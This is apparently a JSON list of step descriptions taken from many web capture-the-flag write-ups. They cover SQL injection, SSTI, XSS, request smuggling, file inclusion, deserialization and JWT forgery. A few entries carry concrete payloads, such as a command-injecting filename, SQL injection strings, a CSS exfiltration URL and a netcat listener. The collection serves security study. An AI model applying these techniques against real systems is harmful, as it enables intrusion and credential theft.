    "Writes a python script in which an SQL payload is sent to the inaccessible server by using SSTI to force the execution of the payload.",
    "Host the 'outer.html' and 'inner.html' files",
    "Open the URL with a browser, note it redirects to Google",
    "Combine the hashed string with 'SharifCTF{hash_here}' to form the flag.",
    "Use the vulnerability to display the content of the flag.txt file",
    "Access the given URL and study the game",
    "Investigated the responses received, paying particular attention to some intriguing HTTP headers: 'Server', 'Via', 'X-Served-By'.",
    "Executes commands using the SSTI vulnerability to read directory contents.",
    "Investigated gallery.php and noticed pictures of devices with internal subnet addresses.",
    "Realized there's potential for prototype pollution as user can influence the setting name",
    "Observe the retrieval of the flag",
    "Receive a response text containing the flag in rot13 encoding.",
    "Retrieved the flag in the response of the HTTP GET request",
    "Change the admin cookie value from false to true",
    "After login, saw a list of toys and some other properties.",
    "Visited lukas-app.de and observed that it's a static site and doesn't have much to exploit",
    "With the knowledge of the correct UUID format and a prefix, construct an SQL injection query that follows the format and includes a statement to match the initial UUID sequence, resulting in a restructuring to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'",
    "Identify a javascript file responsible for crafting the XML envelope",
    "Understand that the app works by listening to 'POST' requests in '/captcha'.",
    "Discovered that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Discovered that the application is a PHP proxy that allows users to visit websites from it.",
    "Analyzed 'phpinfo()' output to see 'disable_functions' configuration and identified that functions for shell command execution were disabled",
    "Learn that the website returns a code identifying the posted message",
    "Identified the suspicious logic of the JavaScript which does not declare the 'name' variable if 'length' query parameter exists but is a string of length 0",
    "Observed a web page which performs a password reset function using security questions, related to Alan Turing's account recovery",
    "Identify /post.php has a Local File Inclusion vulnerability.",
    "Received a successful response from the webserver, indicating the attack has worked.",
    "Uploaded a large number of valid files and manipulated 'app.post('/upload' to process with invalid 'req.files[req.query.formid]'",
    "Understand the concept of $$ variable in PHP and how it is used in the code",
    "Discover that the Flask session secret key is hardcoded into the source code, selected randomly from an array of cookie names.",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie and accessed the webpage",
    "Accessed the website home page and noticed a strange message of INSTRUO team's love for cookies",
    "Tried to manipulate the `clipboard_getData` function found in `main.dart.js`.",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Decode the flagged text via rot13 to reveal the true flag.",
    "Used the page count and PDFs list to write a manipulated 'hacked.pdf' file.",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it, implying a possibility of Cross-site Scripting (XSS)",
    "Set up a server to catch the redirected request with admin cookies",
    "Recognize that all open HTML tags '<' have been removed, making a traditional XSS attack impossible.",
    "Here 'username', 'password' and 'salt' can be any values, we just need to satisfy the if condition to get the flag",
    "Accessed the given website and observed an interface that offered XML parsing as a service.",
    "Identified that Flask's 'render_template_string' function is used to generate the SMS message in 'send_sms' function",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Detected SQL injection vulnerability on INSERT statement",
    "Guessed that an 'application/x-www-form-urlencoded' parameter must be used to perform the search operation.",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Decode the ROT13 encrypted message in the HTTP response",
    "Observed two <link> tags that appeared unusual",
    "Identified prototype pollution vulnerability in `utils.merge()` method",
    "Injected final cookie named 'admin' with value 'true'",
    "Log in with junk value",
    "Connect to the given URL to view the source code.",
    "Uploaded a PHP webshell with a .phtml extension",
    "Identified that the cookie 'token' has the httpOnly attribute, so it cannot be retrieved by XSS",
    "Identified that the OTP code was validated using SQL 'LIKE' operator and tried to insert '%' wildcard to bypass check",
    "Noticed that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "Connect to https://web5.ctfsecurinets.com/flags.php with the username and password to reveal the flag",
    "To access the iframe's contents which should be the response from `http://api:8000/`, bypassed SOP by exploiting the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Found a `token` cookie and checked its value on jwt.io.",
    "Set up a simple Node.js server backend to receive and log the cookie transferred as a query parameter",
    "Enumerated permissions using tools like 'enumerate-iam' and 'pacu'",
    "Understood that the JWT token is essentially encoded JSON data which are signed and verified on the server-side",
    "Recognized a possible chance to test Local File Inclusion (LFI) through 'ip.address/?lang=es.php'",
    "Examined the application's functionality endpoint '/files/'. Introduced the GUID via the 'X-guid' HTTP header.",
    "By using the 'dig' command on 'asdf.jsapi.tech', it was confirmed that any new repository with a CNAME file containing 'asdf.jsapi.tech' can be created to serve a GitHub pages site at 'asdf.jsapi.tech'.",
    "Checked routes.py file which contains the application logic",
    "Research about PhantomJS/2.1.1 and identified a known vulnerability (CVE-2019-17221)",
    "Found the 'robots.txt' file at 'http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt'",
    "Discover that if the string starts with '0e...', PHP treats it as a float with value 0.0",
    "Identified a normal SSRF in curl",
    "Received the flag 'inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}'",
    "Access the '/logs' endpoint with authentication to view the server logs which now include the value of 'FLAG' due to log poisoning.",
    "Excluded the reference to the dummy page and created separate PDF page lists for both input PDFs.",
    "Reviewed the source code in `database.sql` file and identified that the flag was in the database with the rest of the toys, with its approved value set to 0 instead of 1.",
    "Experienced difficulties finding the number of columns to use in the UNION SELECT due to browser extension issues",
    "Created a `redirect.php` that when visited would redirect the renderer's browser to our second exploit page.",
    "Consult the official Python documentation to learn about special characters usable in regex",
    "Replaced the 'with' value with the word 'flag'.",
    "Understood each book's URL structure on server as /books/USER_ID/FILENAME",
    "Accessed the login page and source code of the web app",
    "Uploaded .htaccess file using previous step's vulnerability.",
    "Analyze Content-Security-Policy",
    "Viewed the page source to analyze the data being displayed",
    "Find 'ip/_ignition/execute-solution' for a Laravel panel with error messages and stack trace",
    "Looked for potential Apache Tomcat vulnerabilities, but only found a minor one",
    "Start a listening host with 'nc -lkv 1337'",
    "Analyzed a provided PCAP file and found POST requests to a '/forgotpassword.html' page.",
    "In `challenge/routes/index.js`, found that the `/api/toylist` endpoint would set `approved` to 1 unless the logged in user is `admin`, indicating that to access the flag, we needed to log in as admin.",
    "Identified additional control which prevents SQL injection if password contains the number '1'",
    "Listed out permitted characters to craft an effective attack payload.",
    "Set up a grep match for 'flag{' to find the starting of the flag.",
    "Retrieved the CTF flag from the accessed page",
    "Created a final script to send the command for flag extraction to the server",
    "Modify the output of the Python code to look like a JavaScript script to be executed.",
    "Examine the Go microservice and note that it uses the Beego web framework, acting as a reverse proxy for the Python microservice when the PUT method is used",
    "Send a GET request to the page with the chosen strings as values for 'i1' and 'i2'",
    "Find the second part of the flag as a comment in the style.css file",
    "Read the 'pdf1.bin' and 'pdf2.bin' files which contain the prefix of the PDF content, which will be the same for both PDFs to ensure the same MD5 hash.",
    "Opened the browser console to interact with Firebase installation",
    "Visited the CTF challenge site to analyse the form provided to upload images.",
    "Append the current character to the password string and output it, along with a section of the server response trimmed by slicing.",
    "Connected to http://ctfchallenges.ritsec.club:4000, received API documentation including the endpoints: /api/admin and /api/normal.",
    "Used the tool 'git-dumper' to extract and download all the contents of the Git repository from the website",
    "Identified that when the admin visits the site (a third request), his request is appended to the incomplete second request, being processed as one single request",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment",
    "Started with port 20022",
    "Write an SQLMap tamper script to prepend 'a' characters to the payload to exceed 8kB.",
    "Trigerred an error by submitting a malformed statement",
    "Discover the admin's subdomain and visit the profile, finding out it is private but has a 'follow' button",
    "Consider that potential .js file candidates for execution are likely to be found in the node_modules folder which contains the source code of installed modules.",
    "Received the flag on the attacker server, indicating the successful execution of the attack.",
    "Found a flag.txt file in the '/admin' directory, but it was a misdirection towards '/useradmin'.",
    "An iframe was injected, with the 'src' set to local files. This enabled a leak of the secret key '19eb794c831f30f099a31b1c095a17d6' from the 'config.py'",
    "Ran the server locally",
    "Detected that the server uses Prerender to handle these requests, implying that Chrome is used to render JavaScript.",
    "Crafted a payload for this on the form 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'. The crafted payload was intended to be used as the filename of the gif file being uploaded.",
    "A POST request is sent to the server with the 'payload' as the data",
    "Notice 'nonce' permitting a script src='assets/js/bootstrap.js'",
    "Created a new malicious URL including the new payload.",
    "Assigned 'triton' as the rocket name in the POST request body",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
    "Wrote a Python script to exfiltrate the output of executed commands",
    "Crafted an HTML payload for exploiting this vulnerability; the task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Successfully read the flag.txt file by replacing one of the RGB values in the 'background' parameter.",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Given fire-place[0].html e4a4c2321d18246d027184605ca52866 as the challenge",
    "The 'books' table has two columns: 'id' and 'info' but SQLmap only displays one entry for 'id' of 1.",
    "Find that `node-serialize` is used in User.js for creating the user-specific `token` and that the npm package is vulnerable to node-deserialization RCE attack ",
    "Collect the flag from the server's response",
    "Retrieved the CTF flag",
    "Script causes browser to begin voting process. Process continues until more than 250 votes are cast during the same PHP session.",
    "Used known strange PHP behavior to circumvent file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Once verified and assembled, the shellcode was executed to obtain the desired output - 'Content-type: text/html' cgi header, SQL query sent to the FD 4, read the response from FD 4, write this response",
    "Decode the jwt cookie using 'JsonCookies' to create a json object",
    "Examined features of the application noticing parameters in the WebSocket message that could be modified to allow callback to our server.",
    "Found an input box where a color could be entered and it was applied after clicking submit",
    "Crafted a malicious payload and passed it via the SQL injection vulnerability using a 'UNION' operation.",
    "Received an HTTP 200 OK status code, as expected.",
    "Identified that the WASM module uses the 'str.length' to validate the buffer, which can be less than the number of characters written into it due to inconsistencies in length measurement of Unicode characters.",
    "Accessed the /robots.txt URL and discovered a Disallowed path /ingen/.",
    "Identified potential SQL Injection vulnerability in the search function's MySQL query builder through string manipulation",
    "Received an error indicating 'triton' as an available rocket name",
    "Received an XPATH syntax error that contained the database name, which was used to compose the flag.",
    "Finally, received the /api/flag contents, URL-decoded the output, and obtained the flag",
    "Identified that an 'account' object with 'username' and 'password' attributes is submitted during registration",
    "Saw that search results affect which image loads: 'y.png' if the query is found within a note, 'n.png' if it's not",
    "Notice a particular cookie: `user_DE7aL1xDCe3BauCWqSVqg_0C5bu2078UgQHIqYsF2h0= 311` which is valid in JavaScript",
    "Go through the provided source code of the backend",
    "Find any brackets or subsequent quotes are still escaped and can't produce valid JavaScript, conclude another route to XSS is needed",
    "The payload utilized was designed to fetch cookies and encode them in base64, then send them to a pre-defined URL controlled by the attacker",
    "Crafted another request smuggling attack, that encapsulates the second request within the chunked contents of the first request.",
    "Made the first commit to the repository, then removed the first file created.",
    "Discover that PHP sessions are file-based and predictably stored at /tmp/sess_<PHPSESSID>.",
    "Used the method `().__class__.__base__.__subclasses__()` to get subclasses of the base class",
    "Identified that the 'login' cookie is deserialized into a Login object",
    "Further reduced the payload character count by poking around and using different functions",
    "Retrieved the flag `STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}`.",
    "Find the public key in '/signature/key.pub' as hinted in '/robots.txt'",
    "Created a script which modified sessionID to valid lua, refreshed the CSRF token and sent a POST request to the /admin/system/refresh_session/ endpoint",
    "Learned that any timing attack with 'performance.now()' would had worked too due to the JavaScript event loop being single-threaded.",
    "Discovered that the username was 'bob' by observing that authentication replies with 'User not found' for nonexistent users and 'Login failed' otherwise",
    "Flipped the comparison check in /var/www/html/wp-includes/user.php at position 5389 to always allow login even with incorrect password",
    "Modify the previous code to print the reversed string",
    "Realized the inability to send multi-line input using RESP protocol as 'urllib.parse' was updated to strip newline characters",
    "Analyzed the website behavior and noticed that an idea can be posted with an assigned ID that can be voted on.",
    "Inspect the webpage and discover it uses XML envelopes via two JavaScript files when buttons are pressed",
    "Change the HTTP method to POST using cURL",
    "Remove the 'noscript' tag and only load the 'img' element to circumvent restrictions",
    "Each page had one letter for the name",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Created a CSRF page that attempts to add the attacker's email to the admin's shared note.",
    "The if statement will be `0 == 'whatever the password is'` which evaluates to true, and the flag will be echoed back",
    "Deployed the previously developed JavaScript payload to the new GitHub Pages site",
    "Saw a message indicating the ability to upload, list, and view LaTeX documents",
    "Recognized from the source code that it is using jQuery's html() method without using the SAFE_FOR_JQUERY flag, hinting that XSS might be possible in this case",
    "Visit the URL http://asuna.nullsession.pw.",
    "Obtained the first flag.",
    "Successfully fetched the flag using the XSS payload",
    "Reveal a 'require_once()' function call, which includes the cookie.php file",
    "Used the provided code snippet to retrieve data from each document in Firestore",
    "The index is randomized, giving us a 10% chance of success. We could simply execute this multiple times until the index is 0.",
    "Access '/robots.txt' on the website and locate a PRIVATE KEY within the file",
    "Use the functions 'get_hidden' and 'get_passwords' in a brute-force attack to find the correct password for the username 'jack'",
    "Realize that the /do-report endpoint is mapped to /forbidden, preventing access unless not going through the proxy",
    "Discovered plan of attack involving creating a new script tag, converting flag images to base64 data, and sending image data externally with the 'src' of the generated script tag",
    "Take note of the embedded iframe within the same origin where the data is sanitized by DOMPurify",
    "Decide to exploit the unsanitized 'alt' parameter by injecting a double quote to break out of the alt tag, followed by a JavaScript event handler for the XSS.",
    "So we can set our own 'salt' and 'hash' just like 'username' and 'password'",
    "Figured out the need of a passcode to perform admin functions.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1' and '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
    "Determined the correct answers to the security questions",
    "Used this exploit to log in",
    "Found the chain of properties that led to the Flask.app object",
    " Triggered phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Learned that python pickles can be used for Remote Code Execution when the caching modules use 'pickle.load()' to load the cached data",
    "Establish a reverse shell which lets you read the flag",
    "Identified the encryption key is generated using `Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));`.",
    "Investigate the website mentioned in the challenge",
    "Found that you need to login as an 'admin' user to get a 'token' ",
    "Discovered the presence of only two tables - nxf8_users and nxf8_sessions.",
    "Navigate into the bucket directory using 'cd buckets/bucketsoffun-ctf/'",
    "Uploaded a PHP file to the server, then made a request to the file to run PHP code while XML parsing is performed",
    "Check the length of the window's history to determine if a redirection has occurred.",
    "Identified that 'transmissions' had a fixed part at the beginning and end, and variable part in the middle",
    "Implemented '__defineSetter__' on 'converters' using sessionID as the first parameter along with an object resolving as a promise",
    "Use the octal notation of 127.0.0.1 IP address which is 0177.0.0.1 to bypass the restrictions",
    "The 'Edit profile' section lets users edit their own name",
    "Notice that ws.origin corresponds to the Origin request header, which is forbidden to be modified by JavaScript with comprises of the webpage URL, i.e., ://hostname:port",
    "Given the /request endpoint from challenge.",
    "Understand '$regex' is acceptable, allowing regex patterns for note contents",
    "Created a custom SQLMap tamper script that appends a payload to the back of the signup date and base64-encoded the entire input before passing it to the injection point at 'GET /legacy_invoice_system/*'",
    "Fifth step: Researched the Fetch API's limit of 20 redirects before a network error is returned.",
    "After receiving another error requesting information on Messi's club, change the 'messi' key value to 'psg'",
    "Assess the web application and find a login function",
    "Modify the HTTP GET parameter to test for arbitrary code executions with print=echo+'';phpinfo()",
    "Found that we can load any JavaScript file by polluting 'data' and 'exports' in '__proto__.data' and '__proto__.path'",
    "Used a bash script to extract the PHPSESSID with auth set",
    "Performed GET request to host https://space.sdc.tf with the endpoint /api/status",
    "On examining the client-side code, discovered that 6 parameters: 'author', 'hidden', 'id', 'postDate', 'text', 'title' are read from the server response",
    "Identify that the sha1 hash of '10932435112' starts with '0e...'",
    "Constructed the complete 'GET' request using all the relevant parameters including the 'darkctf', 'ctf2020', 'karma', and '2020' query parameters and set the 'User-Agent' as required by the PHP code",
    "Crafting another request setting the remote_addr to the required fake address",
    "View the source code of authentication.php by navigating to /authentication.phps",
    "Recognize that ATS interprets \\\"chunked\\\" as chunked and Puma ignores invalid / unsupported Transfer-Encoding (TE) values",
    "Realized that the GET handler for '/localisation-file' allows the reading of arbitrary files given the input 'language' in the JWT token",
    "Analyze the JavaScript bundle to understand how the hash is calculated. Identify needed parameters: username, nonce, and cnonce.",
    "Use the URL provided( 'http://35.207.189.79/api/login' ) to analyse the response of the authentication API",
    "Opened the given link",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Attempting to navigate to login.php resulted in a 403 Forbidden error.",
    "Noticed that files with commonly used extensions are downloaded, while .html files are rendered inline",
    "Realize that the `SQL` class executes SQL queries and uses the results for authentication.",
    "Identify that files retrieved need to pass certain conditions: no spaces or slashes in filename, filename length five or less, and only js, ts, cpp, c files allowed",
    "Sent a curl request, setting the cookie to a given string",
    "Analyzed the client source code and read the official Firebase Firestore documentation",
    "Checked for a possibility of XSS injection in the CSRF token script.",
    "In the decompiled code, identified a string 'sRPd45w_0' which is a rearrangement of 'P4s5_w0Rd'.",
    "Logged in using the credentials: admin:admin",
    "Create a new DOCX file and alter the file 'app.xml' inside it where the number of pages is stored",
    "Run command line script using curl to set up a request with malicious cookie data to execute child process for reading the flag file",
    "Understand that the challenge is to bypass the script inside the iframe which validates the origin and ID of the message before rendering the body content",
    "Developed a suspicion of a directory traversal vulnerability either in the GET path handling or the POST filename",
    "Experimented with the meme generator functionality, noting the server requests",
    "The payload utilized was designed to fetch cookies and encode them in base64, then send them to a pre-defined URL controlled by the attacker",
    "Realize that the server signs new RS256 tokens with the private key, signKey, but we could generate our own HS256 token since we know the public key",
    "Found a commented item in the HTML source of the page: <!-- bashferno.cgi -->.",
    "Retrieve the flag.",
    "SQL injection refers to the manipulation of a query to interact with the website's database, it's potentially detected here when the result of the book with 'id=1' prints on inputting the URL https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271.",
    "Interpret that 'b1' and 'b2' are initialized with a random number from 0-500.",
    "Realised that the generated PDF had the flag inside",
    "Logged in using the provided credentials.",
    "An integer entry can be submitted, and the web application responds",
    "Analyzed the server script running at the provided URL, observing that it takes user input as the 'icecream' value and uses a secure cookie for comparison to display a flag value.",
    "Updated the '$url' attribute in the serialized object to bypass localhost address checks by setting it to 'file:///var/www/html/config.php'.",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments",
    "Attempted a simple GET request to /rocketLaunch, received a notice that the request body must be JSON",
    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Decided to use CSRF (Cross-Origin Request Forgery) attack to change the status to 'premium', the only missing piece is the 'token'",
    "Upon searching for 'vulnerability' in the GitHub repository's Issues, found an unfixed issue revealing a Local File Inclusion (LFI) vulnerability in PHP-Proxy.",
    "Using SQL injection via a POST request to the /login.php with altered email and pass fields: 'test' UNION SELECT 'test', 'test'#.",
    "Visiting a non-existent route starting with '/admin/' to trigger a 404 error page, discovering a template injection vulnerability.",
    "Browser fetches '/' with the cookie value appended",
    "Inserted 'blue}; input[type=\"password\"][value^=\"c\"] {background-image: url('https://example.com?c');' into the color input field to test CSS injection and extracting the first character of the password",
    "Use the exiftool to insert PHP code into the DocumentName of the image that can execute commands remotely",
    "Made a POST request to the /flag endpoint",
    "Constructed a post form to add the attacker's email (my_email@foo.com) to the admin's shared list.",
    "Identified the opportunity for a PHP Object Injections vulnerability due to the deserialization process",
    "Embed this crafted JS snippet into an HTML file and upload it to the user profile",
    "Due to the SQL Injection, authentication was bypassed by making the conditional statement in the SQL query always true.",
    "Submitted this payload to the meme generator",
    "Create a working XSS by crafting a precise content payload",
    "Register a delay for the time it takes for the page to load and possibly redirect.",
    "Connected to the website and experienced multiple redirections from one page to another"
]